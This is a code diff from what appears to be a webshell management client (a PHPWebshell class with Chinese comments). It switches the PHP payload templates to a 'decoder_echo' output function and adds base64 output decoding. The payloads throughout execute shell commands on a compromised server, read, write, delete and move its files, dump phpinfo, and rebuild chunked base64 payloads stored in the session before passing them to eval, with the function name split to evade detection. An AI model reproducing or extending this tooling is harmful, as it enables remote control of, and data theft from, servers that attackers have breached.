@@ -78,22 +78,22 @@ foreach ($files as $file) {
         "filesize" => filesize($filePath)
     ));
 }
-echo json_encode($result);
+decoder_echo(json_encode($result));
 """
 
 GET_FILE_CONTENT_PHP = """
 $filePath = FILE_PATH;
 if(!is_file($filePath)) {
-    echo "WRONG_NOT_FILE";
+    decoder_echo("WRONG_NOT_FILE");
 }
 else if(!is_readable($filePath)) {
-    echo "WRONG_NO_PERMISSION";
+    decoder_echo("WRONG_NO_PERMISSION");
 }
 else if(filesize($filePath) > MAX_SIZE) {
-    echo "WRONG_FILE_TOO_LARGE";
+    decoder_echo("WRONG_FILE_TOO_LARGE");
 }else {
     $content = file_get_contents($filePath);
-    echo base64_encode($content);
+    decoder_echo(base64_encode($content));
 }
 """
 
@@ -101,10 +101,10 @@ PUT_FILE_CONTENT_PHP = """
 $filePath = FILE_PATH;
 $fileContent = base64_decode(FILE_CONTENT);
 if(!is_file($filePath) && is_writeable($filePath)) {
-    echo "WRONG_NO_PERMISSION";
+    decoder_echo("WRONG_NO_PERMISSION");
 }else{
     $content = file_put_contents($filePath, $fileContent);
-    echo "SUCCESS";
+    decoder_echo("SUCCESS");
 }
 """
 
@@ -112,15 +112,15 @@ if(!is_file($filePath) && is_writeable($filePath)) {
 DELETE_FILE_PHP = """
 $filePath = FILE_PATH;
 if(!is_file($filePath)) {
-    echo "WRONG_NOT_FILE";
+    decoder_echo("WRONG_NOT_FILE");
 }else if(!is_writable($filePath)) {
-    echo "WRONG_NO_PERMISSION";
+    decoder_echo("WRONG_NO_PERMISSION");
 }else {
     $result = unlink($filePath);
     if($result) {
-        echo "SUCCESS";
+        decoder_echo("SUCCESS");
     }else{
-        echo "FAILED";
+        decoder_echo("FAILED");
     }
 }
 """
@@ -129,15 +129,15 @@ MOVE_FILE_PHP = """
 $filePath = #FILEPATH#;
 $newFilePath = #NEW_FILEPATH#;
 if(!file_exists($filePath)) {
-    echo "WRONG_NOT_EXIST";
+    decoder_echo("WRONG_NOT_EXIST");
 }else if(!is_writeable($filePath)) {
-    echo "WRONG_NO_PERMISSION";
+    decoder_echo("WRONG_NO_PERMISSION");
 }else {
     $result = rename($filePath, $newFilePath);
     if($result) {
-        echo "SUCCESS";
+        decoder_echo("SUCCESS");
     }else{
-        echo "FAILED";
+        decoder_echo("FAILED");
     }
 }
 """
@@ -200,7 +200,7 @@ array_push($infos, [
     "key" => "EXTENSIONS",
     "value" => implode(", ", get_loaded_extensions())
 ]);
-echo json_encode($infos);
+decoder_echo(json_encode($infos));
 """
 
 DOWNLOAD_PHPINFO_PHP = """
@@ -208,7 +208,7 @@ ob_start();
 phpinfo();
 $content = ob_get_contents();
 ob_end_clean();
-echo base64_encode($content);
+decoder_echo(base64_encode($content));
 """
 
 EVAL_PHP = """
@@ -225,7 +225,7 @@ $_SESSION['PAYLOAD_STORE'][PAYLOAD_ORDER] = $b64_part;
 
 PAYLOAD_SESSIONIZE_TRIGGER = """
 if(!$_SESSION['PAYLOAD_STORE']) {
-    echo "PAYLOAD_SESSIONIZE_UNEXIST";
+    decoder_echo("PAYLOAD_SESSIONIZE_UNEXIST");
 }else{
     $payload = "";
     $parts = $_SESSION['PAYLOAD_STORE'];
@@ -236,7 +236,7 @@ if(!$_SESSION['PAYLOAD_STORE']) {
         $payload .= $parts[$i];
     }
     if($i != count($parts)) {
-        echo "PAYLOAD_SESSIONIZE_UNEXIST";
+        decoder_echo("PAYLOAD_SESSIONIZE_UNEXIST");
     }else{
         $payload = ("base"."64_decode")($payload);
         eval($payload);
@@ -336,10 +336,8 @@ class PHPWebshell(PHPSessionInterface):
         # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
         # 所以其中的任何一项都可能不存在，需要使用get取默认值
         options = conn if conn is not None else {}
-        self.decoder = {"raw": DECODER_RAW, "base64": DECODER_BASE64}[
-            options.get("decoder", "raw")
-        ]
         self.encoder = options.get("encoder", "raw")
+        self.decoder = options.get("decoder", "raw")
         self.sessionize_payload = options.get("sessionize_payload", False)
         # for upload file
         self.chunk_size = 32 * 1024
@@ -354,8 +352,15 @@ class PHPWebshell(PHPSessionInterface):
             return f'eval(base64_decode("{encoded}"));'
         raise RuntimeError(f"Unsupported encoder: {self.encoder}")
 
+    def decode(self, output: str) -> str:
+        if self.decoder == "raw":
+            return output
+        elif self.decoder == "base64":
+            return base64.b64decode(output).decode("utf-8")
+        raise RuntimeError(f"Unsupported encoder: {self.encoder}")
+
     async def execute_cmd(self, cmd: str) -> str:
-        return await self.submit(f"system({cmd!r});")
+        return await self.submit(f"decoder_echo(shell_exec({cmd!r}));")
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
         dir_path = dir_path.removesuffix("/") + "/"
@@ -450,7 +455,7 @@ class PHPWebshell(PHPSessionInterface):
             $file = tempnam("", "");
             $content = base64_decode('BASE64_CONTENT');
             file_put_contents($file, $content);
-            echo $file;
+            decoder_echo($file);
             """.replace(
                 "    ", ""
             ).replace(
@@ -483,16 +488,16 @@ class PHPWebshell(PHPSessionInterface):
             @unlink($file);
         }
         if(file_exists(FILENAME) && !is_writeable(FILENAME)) {
-            echo "WRONG_NO_PERMISSION";
+            decoder_echo("WRONG_NO_PERMISSION");
         }
         else if(!file_exists(FILENAME) && !is_writeable(dirname(FILENAME))) {
-            echo "WRONG_NO_PERMISSION_DIR";
+            decoder_echo("WRONG_NO_PERMISSION_DIR");
         }
         else if($readerror) {
-            echo "WRONG_READ_ERROR";
+            decoder_echo("WRONG_READ_ERROR");
         }else{
             file_put_contents(FILENAME, $content);
-            echo "DONE";
+            decoder_echo("DONE");
         }
 
         """.replace(
@@ -510,7 +515,7 @@ class PHPWebshell(PHPSessionInterface):
         return result == "DONE"
 
     async def get_pwd(self) -> str:
-        return await self.submit("echo __DIR__;")
+        return await self.submit("decoder_echo(__DIR__);")
 
     async def test_usablility(self) -> bool:
         first_string, second_string = (
@@ -518,7 +523,9 @@ class PHPWebshell(PHPSessionInterface):
             "".join(random.choices(string.ascii_lowercase, k=6)),
         )
         try:
-            result = await self.submit(f"echo '{first_string}' . '{second_string}';")
+            result = await self.submit(
+                f"decoder_echo('{first_string}' . '{second_string}');"
+            )
         except exceptions.NetworkError:
             return False
         return (first_string + second_string) in result
@@ -562,7 +569,7 @@ class PHPWebshell(PHPSessionInterface):
             delimiter_stop=stop,
             payload_raw=payload,
             session_id=DEFAULT_SESSION_ID,
-            decoder=self.decoder,
+            decoder={"raw": DECODER_RAW, "base64": DECODER_BASE64}[self.decoder],
         )
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
@@ -585,7 +592,9 @@ class PHPWebshell(PHPSessionInterface):
         if idx_stop_r == -1:
             raise exceptions.UnexpectedError("找不到输出文本的结尾")
         idx_stop = idx_stop_r + idx_start
-        return text[idx_start + len(start) : idx_stop]
+        output = text[idx_start + len(start) : idx_stop]
+        output = self.decode(output)
+        return output
 
     async def submit(self, payload: str) -> str:
         # sessionize_payload
